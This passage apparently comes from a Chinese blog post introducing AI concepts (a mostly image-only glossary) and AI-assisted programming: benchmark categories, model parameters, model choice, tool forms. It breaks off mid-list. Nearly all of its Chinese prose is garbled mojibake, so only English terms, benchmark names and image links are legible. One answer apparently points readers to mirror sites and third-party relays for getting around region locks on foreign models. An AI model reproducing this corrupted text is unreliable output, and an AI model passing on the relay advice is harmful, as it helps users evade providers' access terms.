<p>ğŸ¶ æ‡‚ç‚¹AIå¸¸è¯†ï¼Œèƒ½è®©ä½ æ›´ <strong>æœ‰çš„æ”¾çŸ¢</strong> åœ° <strong>ç”¨å¥½AI</strong> (<strong>è£…é€¼</strong>)ï¼Œæ¯”å¦‚ï¼šè¿ Token éƒ½ä¸çŸ¥é“çš„è¯ï¼Œå°±æœ‰ç‚¹è´»ç¬‘å¤§æ–¹äº†ã€‚è¿™é‡Œåªæ˜¯ç®€å•ç½—åˆ—ä¸‹ç›¸å…³åè¯ï¼Œä¸ç”¨æ­»è®°ï¼Œæœ‰ä¸ªå¤§æ¦‚å°è±¡å³å¯ï¼Œä¸å½±å“ä½ ä½¿ç”¨AIï¼Œè·³è¿‡ä¹Ÿæ²¡å…³ç³»ã€‚ğŸ˜„ è¯¦ç»†è®²è§£ï¼Œå»ºè®®ç›´æ¥å¤åˆ¶åè¯é—®é¢˜AIï¼Œä¹Ÿå¯ç§»æ­¥è‡³<a href="https://juejin.cn/post/7533044069939478538" target="_blank" title="https://juejin.cn/post/7533044069939478538">ã€ŠAI-æ¦‚å¿µåè¯ &amp; LLM-æ¨¡å‹å¾®è°ƒã€‹</a>è‡ªè¡ŒæŸ¥é˜…~</p>
<h3 data-id="heading-18">5.1. AI (äººå·¥æ™ºèƒ½) åŸºç¡€æ¦‚å¿µ</h3>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/423da8677720408895d1a6b71c133d38~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgY29kZXJfcGln:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765877774&amp;x-signature=CYNIHevRKaO0teIs4PJr9yD9lOY%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-19">5.2. NLP (è‡ªç„¶è¯­è¨€å¤„ç†)</h3>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/21e62f369d0347e0a9a1c6702535f5eb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgY29kZXJfcGln:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765877774&amp;x-signature=8GUFcZDJkTDcnZp3E11gGuLUAdo%3D" alt="" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f7f7889764c94cce82d46d34deed2618~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgY29kZXJfcGln:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765877774&amp;x-signature=hbjABTV4qj6ZBW1sOPDY08svjrw%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-20">5.3. Transformer æ¶æ„ (å¤§å‹æ¨¡å‹åŸºç¡€)</h3>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ba504f4fc585408e87bc4511c920c4a1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgY29kZXJfcGln:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765877774&amp;x-signature=NcHBcyL0gS3yUbj%2BW6v3fZto7O4%3D" alt="" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ae86a24c667c4324985326b41f79035a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgY29kZXJfcGln:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765877774&amp;x-signature=T7q0d03ZkESapygtrSoHseJZ324%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-21">5.4. è¯­è¨€æ¨¡å‹åŸºç¡€ (Language Models)</h3>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f4e97cf63bfe4c3182f81511e6ba15b4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgY29kZXJfcGln:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765877774&amp;x-signature=BssiDVUfI3XlzL2sjArrvmyshKw%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-22">5.5. LLM æ ¸å¿ƒæ¦‚å¿µ (Large Language Models)</h3>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0984032ecc214a73aec6497f1f46920c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgY29kZXJfcGln:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765877774&amp;x-signature=rNdiGRaLcdq9wIOpK%2Bycydb96%2B8%3D" alt="" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c5e7600a09ef4d658cb405d76eb747b4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgY29kZXJfcGln:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765877774&amp;x-signature=WmiBwJ7S9MEC7S8C0AfmDKa%2FXvM%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-23">5.6. æ•°æ®ä¸è®­ç»ƒæµç¨‹ (Training &amp; Fine-tuning)</h3>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/bd77106e29df4e5e92ac0f1cc192aae4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgY29kZXJfcGln:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765877774&amp;x-signature=f8D7PjM6RlTkgPrEMr8T2IKS%2BGY%3D" alt="" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fe50dc0fbb184d4db74c51669fadd56a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgY29kZXJfcGln:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765877774&amp;x-signature=PSNFzdvW6T6hsNrP8pA8b5EE8cQ%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-24">5.7. æ¨ç†é˜¶æ®µ (Inference)</h3>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ccdc722fede94755bafdf671279dcda7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgY29kZXJfcGln:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765877774&amp;x-signature=LORD5194irf6wnhaY7w%2BDlo3Uzc%3D" alt="" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c33dd7fef7154825b914770fa7ebe767~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgY29kZXJfcGln:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765877774&amp;x-signature=iaNi1eKGkUQgXh2GOKbhyHZORaI%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-25">5.8. RAG (æ£€ç´¢å¢å¼ºç”Ÿæˆ)</h3>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e539912fde584ed4bc3855037d548a49~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgY29kZXJfcGln:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765877774&amp;x-signature=a0qGFLL2b3wTvYmhJiEu0fNKMMM%3D" alt="" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/23c15d145cb24b64bf24bfca398a8442~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgY29kZXJfcGln:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765877774&amp;x-signature=3mzqubHlUJhAdvGOCNPc1amOZUk%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-26">5.9. å¤šæ¨¡æ€ AI</h3>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/512944c9d38a44d99c51e29d3fc8a616~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgY29kZXJfcGln:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765877774&amp;x-signature=%2Ft%2Fb8yioHYPWBgknk%2BRmAy%2Flel8%3D" alt="" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5673bd0c68154b949ad15efce27db42d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgY29kZXJfcGln:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765877774&amp;x-signature=0e962teCNlAXtU9OGYDCp178etc%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-27">5.10. AIGC (ç”Ÿæˆå¼å†…å®¹)</h3>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8a49707e5c654a9697e0fcdd4d2e6825~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgY29kZXJfcGln:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765877774&amp;x-signature=GemaoaW03KWrSw0JqAFWGFzTkn8%3D" alt="" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/71fff1842efb43229a0a7598558787e3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgY29kZXJfcGln:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765877774&amp;x-signature=d%2FQwwGN3BAsLslrS%2FpfnZna8i%2Bg%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-28">5.11. æ¨¡å‹å‹ç¼©ã€éƒ¨ç½²ä¸åŠ é€Ÿ (LLMOps)</h3>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c9de85bc6cd4443092b31982e43f4967~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgY29kZXJfcGln:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765877774&amp;x-signature=n%2F8XRF%2B%2BaTmXOBhjO6B9bLcHkKQ%3D" alt="" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ba82241ff1f048eda80acbca33cce5ae~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgY29kZXJfcGln:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765877774&amp;x-signature=Ks7FM9KvTezKvLOlC4bidDG2MnE%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-29">5.12. Agent (è‡ªä¸»æ™ºèƒ½ä½“)</h3>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9b752eecdd7c4cb78eec83b19ac655ff~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgY29kZXJfcGln:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765877774&amp;x-signature=fR9cIYFhxcZZ9SbGVwnH7NL5eto%3D" alt="" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4f18231e8f0943d9aaf68d9a0b5e4375~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgY29kZXJfcGln:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765877774&amp;x-signature=%2FZ80j6fe2Gsp%2BnTtzXRqRTG6Q38%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-30">5.13. AGI (é€šå¾€é€šç”¨æ™ºèƒ½)</h3>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/72c36792d9894f52a6a88ba6419c85eb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgY29kZXJfcGln:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765877774&amp;x-signature=1%2FO0wqCMwNKs8rK%2B1xRrc8KKTVA%3D" alt="" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4f24a6d0c45f4561a226c5e40867ab0c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgY29kZXJfcGln:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765877774&amp;x-signature=94zkjUO1Mc4wKC67rixjzAxBCus%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-31">6. AI ç¼–ç¨‹é¢†åŸŸä¸“ç²¾</h2>
<p>ğŸ˜„ æœ€åï¼ŒèŠèŠ <strong>AI ç¼–ç¨‹</strong> é¢†åŸŸçš„ä¸€äº›å¿ƒå¾—~</p>
<h3 data-id="heading-32">6.1. å‰ç½®çŸ¥è¯†</h3>
<h4 data-id="heading-33">6.1.1. ç¼–ç¨‹æ¨¡å‹</h4>
<p><strong>AI</strong> ä»£ç å†™å¾—å¥½ä¸å¥½ï¼Œä¸»è¦çœ‹ "<strong>æ¨¡å‹</strong>" çš„ "<strong>ç¼–ç¨‹èƒ½åŠ›</strong>"ï¼Œè¯„ä¼° "<strong>æ¨¡å‹ä¼˜åŠ£</strong>" çš„å‡ ä¸ª "<strong>å¸¸è§ç»´åº¦</strong>"ï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/64781f9b63b24ca0bcb9e53c1807489f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgY29kZXJfcGln:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765877774&amp;x-signature=i%2FVn1PPhQhcvuDe4meDdL9Dm%2BW4%3D" alt="" loading="lazy"/></p>
<p><strong>LLM</strong> çš„èƒ½åŠ›å¾ˆéš¾ç”¨ä¸€å¥è¯æ¦‚æ‹¬ï¼Œæ‰€ä»¥å‚å•†ä»¬æ¯æ¬¡å‘æ–°æ¨¡å‹éƒ½ä¼šç”¨ä¸€å † <strong>Benchmark</strong> æ¥è¯æ˜ (ğŸ¶ä¸æœï¼Œè·‘ä¸ªåˆ†ï¼Ÿ)</p>
<p>â‘  <strong>æ¨ç†ä¸æ•°å­¦èƒ½åŠ›</strong> (Reasoning)</p>
<blockquote>
<p>"<strong>æ™ºèƒ½çš„æ ¸å¿ƒæŒ‡æ ‡</strong>"ï¼Œé«˜åˆ†æ„å‘³ç€èƒ½å¤Ÿåšæ›´å¤æ‚ä»»åŠ¡ (å¦‚ï¼šå·¥ç¨‹è§„åˆ’ã€Agentç­‰)ï¼Œå¸¸è§åŸºå‡†ï¼š<strong>GSM8K</strong>-å°å­¦å¥¥æ•°å¼æ•°å­¦é¢˜ã€<strong>MATH</strong>-é«˜éš¾åº¦æ•°å­¦ã€<strong>AIME/AMC</strong>-å¥¥æ—åŒ¹å…‹æ•°å­¦ã€<strong>GPQA</strong>-åšå£«çº§ç§‘å­¦é—®ç­”ã€<strong>BigBench Hard</strong> (BBH)-æ¨ç†éš¾é¢˜é›†åˆ ç­‰ã€‚</p>
</blockquote>
<p>â‘¡ <strong>è¯­è¨€ç†è§£ä¸çŸ¥è¯†èƒ½åŠ›</strong> (Language / Knowledge)</p>
<blockquote>
<p>"<strong>é€šç”¨æ¨¡å‹ IQ æµ‹è¯•</strong>"ï¼Œå¸¸è§åŸºå‡†ï¼š<strong>MMLU</strong>-å¤§å­¦ç”Ÿå¤šå­¦ç§‘ç†è§£æµ‹è¯•ã€<strong>MMLU-Pro</strong> - æ›´éš¾ç‰ˆæœ¬ã€<strong>ARC / HellaSwag</strong> - å¸¸è¯†æ¨ç†ã€<strong>OpenBookQA/TriviaQA</strong> - äº‹å®/çŸ¥è¯†é—®ç­” ç­‰ã€‚</p>
</blockquote>
<p>â‘¢ âœ¨<strong>ç¼–ç¨‹èƒ½åŠ›</strong> (Coding)</p>
<blockquote>
<p>"<strong>å•†ä¸šä»·å€¼æé«˜çš„åº”ç”¨ç‚¹</strong>"ï¼Œå¸¸è§åŸºå‡†ï¼š<strong>HumanEval</strong> - å‡½æ•°çº§åˆ«ä»£ç ç”Ÿæˆã€<strong>MBPP / MBPP+</strong> ç®€å•ç¼–ç¨‹é¢˜ã€<strong>SWE-Bench / SWE-Bench Verified</strong>âœ¨ï¼šçœŸå® GitHub issue + å¤šæ–‡ä»¶å·¥ç¨‹ (æœ€æ¥è¿‘çœŸå®å¼€å‘åœºæ™¯ï¼Œè¿‘ä¸¤å¹´å‚å•†éƒ½åœ¨æ¯”è¿™ä¸ª)ã€<strong>Codeforces</strong>-ç®—æ³•æ¯”èµ›ã€CRUXEval / RepoBench-é¡¹ç›®çº§åˆ†æ ç­‰ã€‚</p>
</blockquote>
<p>â‘£ <strong>å¤šæ¨¡æ€èƒ½åŠ›</strong> (Multimodal)</p>
<blockquote>
<p>"<strong>ä¸‹ä¸€ä»£ AI äº§å“çš„å¿…äº‰ä¹‹åœ°</strong>" (åš AI åŠ©æ‰‹ã€çœ‹å›¾ã€è‡ªåŠ¨åŒ–åŠå…¬ç­‰)ï¼Œå¸¸è§åŸºå‡†ï¼š<strong>MathVista</strong>ï¼šå¸¦å›¾çš„æ•°å­¦æ¨ç†ã€<strong>ChartQA / DocVQA</strong>ï¼šæ–‡æ¡£ç†è§£ã€<strong>TextCaps / ImageNet</strong>ï¼šè§†è§‰åœºæ™¯ç†è§£ã€<strong>VideoMME</strong>ï¼šè§†é¢‘ç†è§£ã€<strong>V-Bench / VQAv2</strong>ï¼šè§†è§‰é—®ç­” ç­‰ã€‚</p>
</blockquote>
<p>â‘¤ <strong>å®‰å…¨æ€§ (Safety / Robustness)</strong></p>
<blockquote>
<p>ä¼ä¸šç”¨æˆ·å¾ˆçœ‹é‡ "<strong>å®‰å…¨åˆè§„</strong>"ï¼Œå¸¸è§åŸºå‡†ï¼š<strong>Harmlessness / Truthfulness</strong>ã€<strong>AdvBench</strong>ï¼šå¯¹æŠ—æ”»å‡»ã€<strong>Red Team çº¢é˜Ÿæµ‹è¯•</strong>ã€<strong>Over-Refusal æµ‹è¯•</strong>ï¼ˆä¸ä¼šä¹±æ‹’ç»ï¼‰ã€<strong>Speculative Safety</strong>ï¼ˆæ¨æµ‹ç”Ÿæˆçš„é£é™©ï¼‰ç­‰ã€‚</p>
</blockquote>
<p>â‘¥ <strong>é€Ÿåº¦/å»¶è¿Ÿ/åå (Performance Metrics)</strong></p>
<blockquote>
<p>"<strong>å†³å®šå®é™…ç”¨æˆ·ä½“éªŒ</strong>"ï¼Œå¸¸è§æŒ‡æ ‡ï¼šTokens per second (æ¨ç†é€Ÿåº¦)ã€First Token Latency (é¦–å­—å»¶è¿Ÿ)ã€Throughput QPS (æ¯ç§’å¤„ç†è¯·æ±‚æ•°)ã€Context processing speed (é•¿æ–‡æ¡£å¤„ç†é€Ÿåº¦)ã€‚</p>
</blockquote>
<hr/>
<p>æœ‰æ—¶è¿˜ä¼šå‘å¸ƒä¸€äº› "<strong>æŠ€æœ¯å‚æ•°</strong>"ï¼š</p>
<ul>
<li><strong>æ¨¡å‹è§„æ¨¡</strong>ï¼šæ¨¡å‹çš„å‚æ•°é‡å¤§å°ï¼Œå½±å“æ¨ç†ä¸è¡¨è¾¾ä¸Šé™ï¼Œè§„æ¨¡è¶Šå¤§ï¼Œèƒ½åŠ›è¶Šå¼ºï¼Œä½†æˆæœ¬ã€å»¶è¿Ÿå’Œéƒ¨ç½²éš¾åº¦ä¹Ÿè¶Šé«˜ã€‚å¦‚ï¼š70B = 70 billion = 700äº¿å‚æ•°ã€‚</li>
<li><strong>è®­ç»ƒæ•°æ®è§„æ¨¡</strong>ï¼šæ¨¡å‹é¢„è®­ç»ƒæ—¶å­¦ä¹ çš„ token æ€»é‡ï¼Œä»£è¡¨å…¶çŸ¥è¯† "<strong>é˜…å†</strong>"ã€‚æ•°æ®è¶Šå¤šé€šå¸¸çŸ¥è¯†è¦†ç›–è¶Šå¹¿ï¼Œä½†è´¨é‡ã€å»é‡å’Œæ¸…æ´—ç­–ç•¥æ¯”å•çº¯å †é‡æ›´å…³é”®ï¼Œé«˜è´¨é‡æ•°æ®æ‰èƒ½è®©æ¨¡å‹è¡¨ç°æ›´ç¨³ã€‚å¦‚ï¼š15T = 15 trillion = 1.5ä¸‡äº¿ä¸ªtokenã€‚</li>
<li><strong>ä¸Šä¸‹æ–‡çª—å£</strong>ï¼šæ¨¡å‹å•æ¬¡å¯æ¥æ”¶å¹¶ "<strong>è®°ä½</strong>" çš„ "<strong>è¾“å…¥é•¿åº¦ä¸Šé™</strong>"ï¼Œå†³å®šä½ èƒ½å¡å¤šå°‘ä»£ç ã€æ–‡æ¡£å’Œå¯¹è¯å†å²ï¼›çª—å£è¶Šå¤§è¶Šé€‚åˆåšæ•´ä»“åˆ†æã€é•¿æ–‡æ¡£é—®ç­”ã€å¤æ‚ä»»åŠ¡ï¼Œä½†ä¼šç‰ºç‰²æˆæœ¬å’Œå»¶è¿Ÿï¼Œä¸”éœ€è¦é¢å¤–æœºåˆ¶ç¡®ä¿åœ¨è¶…é•¿ä¸Šä¸‹æ–‡ä¸­ä»èƒ½æŠ“ä½é‡ç‚¹ã€‚</li>
<li><strong>æ¨ç†æ·±åº¦</strong>ï¼šæ¨¡å‹ç­”é¢˜æ—¶çš„ "<strong>æ€è€ƒåŠ›åº¦</strong>"ï¼Œæ·±æ¨ç†æ¨¡å¼æ›´å‡†ç¡®ã€é€‚åˆå¤æ‚é—®é¢˜ï¼Œä½†ä¼šæ›´æ…¢ã€æ›´è´µï¼Œé€‚åˆå…³é”®ä»»åŠ¡è€Œéé«˜é¢‘äº¤äº’ã€‚</li>
<li><strong>ä»·æ ¼</strong>ï¼šæŒ‰ <strong>token</strong> æ”¶è´¹ï¼ŒåŒºåˆ†è¾“å…¥ä»·ã€è¾“å‡ºä»·ä¸æœ€å°è®¡è´¹å•ä½ï¼›éƒ¨åˆ†æ¨¡å‹æä¾› "<strong>ç¼“å­˜å‘½ä¸­ (cache hit)</strong> "ï¼Œå¯¹é‡å¤æç¤ºåªæŒ‰æ›´ä½è´¹ç‡è®¡è´¹ï¼Œå¤§å¹…é™ä½é•¿ä¸Šä¸‹æ–‡ä¸å¤šè½®è°ƒç”¨æˆæœ¬ã€‚ä»·æ ¼å†³å®šæ¨¡å‹å¯å¦å¤§è§„æ¨¡ã€é¢‘ç¹å’Œä½æˆæœ¬ä½¿ç”¨ã€‚</li>
<li><strong>å»¶è¿Ÿæ ‡å‡†</strong>ï¼šåŒ…å«é¦– token å»¶è¿Ÿ (<strong>FTL</strong>) ä¸ <strong>ç”Ÿæˆé€Ÿåº¦</strong> (token/s)ï¼Œåˆ†åˆ«å†³å®š "<strong>å¤šä¹…å¼€å§‹å›åº”</strong>" å’Œ "<strong>å†…å®¹ç”Ÿæˆæœ‰å¤šå¿«</strong>"ï¼›ä½å»¶è¿Ÿè®©è¡¥å…¨ã€å¯¹è¯ã€Agent æµç¨‹æ›´æµç•…ï¼Œè€Œé«˜å»¶è¿Ÿä¼šä¸¥é‡å½±å“å¼€å‘ä½“éªŒä¸å®æ—¶æ€§ï¼Œæ˜¯å·¥ç¨‹ä¸­æ¯” "æ›´èªæ˜ä¸€ç‚¹" æ›´é‡è¦çš„æ€§èƒ½æŒ‡æ ‡ã€‚</li>
<li><strong>æ¨¡å‹è¡Œä¸ºæ§åˆ¶èƒ½åŠ›</strong>ï¼šé€šè¿‡ Temperatureã€Top-pã€System Promptã€å·¥å…·æƒé™ç­‰æœºåˆ¶æ§åˆ¶æ¨¡å‹çš„éšæœºæ€§ã€ç¨³å®šæ€§ä¸æ‰§è¡Œè¾¹ç•Œï¼›è¡Œä¸ºè¶Šå¯æ§ï¼Œè¶Šèƒ½ç¡®ä¿è¾“å‡ºä¸€è‡´ã€ä¸è·‘åï¼Œå¹¶å®‰å…¨åœ°æ¥å…¥å·¥å…·é“¾æˆ–ç”Ÿäº§ç³»ç»Ÿï¼Œæ˜¯æŠŠæ¨¡å‹ä» demo æå‡åˆ°å¯ä¸Šçº¿èƒ½åŠ›çš„å…³é”®å‚æ•°ã€‚</li>
</ul>
<p>ğŸ¤¡ ä¸ªäºº "<strong>ä¸»è§‚</strong>" è®¤ä¸ºçš„ <strong>"ç¼–ç¨‹æ¨¡å‹"</strong> èƒ½åŠ›æ’åï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/07a9ac0ccba64301a0be0744add1f713~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgY29kZXJfcGln:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765877774&amp;x-signature=JLRiwcq2snpHk7CWciA6jynxJKQ%3D" alt="" loading="lazy"/></p>
<p>ğŸ˜Š ä¸€å¥è¯æ¦‚æ‹¬æˆ‘çš„ "<strong>é€‰æ¨¡å‹ç­–ç•¥</strong>"ï¼š</p>
<blockquote>
<p>é€‰å¥½çš„æ¨¡å‹äº‹åŠåŠŸå€ï¼<strong>å·¥ç¨‹å¤§æ´»</strong> æ‰¾ <strong>Claude</strong>ï¼Œ<strong>ç²¾ç»†å°æ´»</strong> (å¦‚æ”¹BUG) ç”¨ <strong>GPT</strong>ï¼Œå†™å‰ç«¯é¡µé¢ç”¨ <strong>Gemini</strong>ã€‚</p>
</blockquote>
<p>ğŸ¶ é—®ï¼šè¿™äº›éƒ½æ˜¯å›½å¤–çš„æ¨¡å‹å•Šï¼Œæ€ä¹ˆæ‰èƒ½ç”¨ä¸Šï¼ŸAç¤¾è¿˜é”åŒºï¼Œç»å¸¸å°å·ï¼Ÿè€Œä¸”ä»·æ ¼å¥½è´µå•Šï¼Ÿ</p>
<blockquote>
<p>ç­”ï¼šğŸ˜ è¿™ä¸ªé—®é¢˜å……é’±å¯ä»¥è§£å†³.jpgï¼Œå¤šé€›ä¸‹æµ· (xian) é²œ (yu) å¸‚åœºï¼Œå›½äººçš„ "<strong>è–…ç¾Šæ¯›</strong>" èƒ½åŠ›ä¸æ˜¯ç›–çš„ï¼Œå„ç§ <strong>"é•œåƒç«™ã€ç¬¬ä¸‰æ–¹ä¸­è½¬"</strong> ã€‚æ°ªé‡‘çš„æ—¶å€™æ³¨æ„æ‰¾æœ‰ "<strong>å”®å</strong>" çš„ï¼Œéšç”¨éšå……ï¼Œä¹° "<strong>çŸ­æœŸ (å¦‚æœˆä»˜)</strong> "ï¼Œä¸è¦ä¹° "<strong>é•¿æœŸ</strong> (å¦‚å¹´ä»˜)"ï¼Œè¿™ç§çœ‹ <strong>LLMå®˜æ–¹</strong> æ”¿ç­–çš„ï¼Œä¸€å°å°±ç›´æ¥Gäº†ï¼Œè¯´ä¸å®šå°± "<strong>å·æ¬¾è·‘è·¯</strong>"~</p>
</blockquote>
<h4 data-id="heading-34">6.1.2. AI ç¼–ç¨‹å·¥å…·çš„å››ç§å½¢æ€</h4>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ea1a843e8efc4b5bbe14101f907504ad~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgY29kZXJfcGln:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765877774&amp;x-signature=Toy%2Fz3e4OTOOnmrOuTw8alWo7Q8%3D" alt="" loading="lazy"/></p>
<p>ğŸ˜„ ä¸€å¥è¯å½’çº³ï¼š</p>
<p><strong>æ™®é€šå¼€å‘è€… &amp; Vibe Codingç”¨æˆ·</strong> ç”¨ <strong>AI IDE/æ’ä»¶</strong> å±…å¤šï¼Œ<strong>DevOps/åç«¯å·¥ç¨‹å¸ˆ</strong> ç”¨ <strong>CLI</strong>ï¼Œ<strong>å›¢é˜Ÿ/ä¼ä¸šç³»ç»Ÿ</strong> ç”¨ <strong>äº‘ç«¯Agent</strong>ï¼Œ<strong>AI åº”ç”¨å¼€å‘è€…</strong> ç”¨ <strong>AI SDK</strong> æ„å»ºæ„å»º AI äº§å“ä¸ Agent ç³»ç»Ÿã€‚</p>
<p>æ¥ç€è¯´ä¸‹ "<strong>AIç¼–ç¨‹</strong>" çš„ä¸‰ç§æ¼”è¿›å±‚æ¬¡~</p>
<h3 data-id="heading-35">6.2. ç¬¬ä¸€å±‚ï¼šAI è¾…åŠ©å¼€å‘</h3>
<p>æœ€æ—©æœŸçš„AIå¼€å‘æ–¹å¼ï¼Œä»¥ã€Œ<strong>äººä¸»å¯¼ + AIè¾…åŠ©</strong>ã€ä¸ºæ ¸å¿ƒé€»è¾‘ï¼Œç”±ä¸¤ç§äº¤äº’æ¨¡å¼ç»„æˆï¼š</p>
<ul>
<li><strong>è¡¥å…¨å¼</strong>ï¼šåŸºäºè¾“å…¥å…‰æ ‡å‰çš„ä¸Šä¸‹æ–‡ï¼Œé¢„æµ‹ä¸‹ä¸€ä¸ªå•è¯ã€ä¸‹ä¸€è¡Œä»£ç ã€ç”šè‡³æ•´ä¸ªå‡½æ•°ã€‚</li>
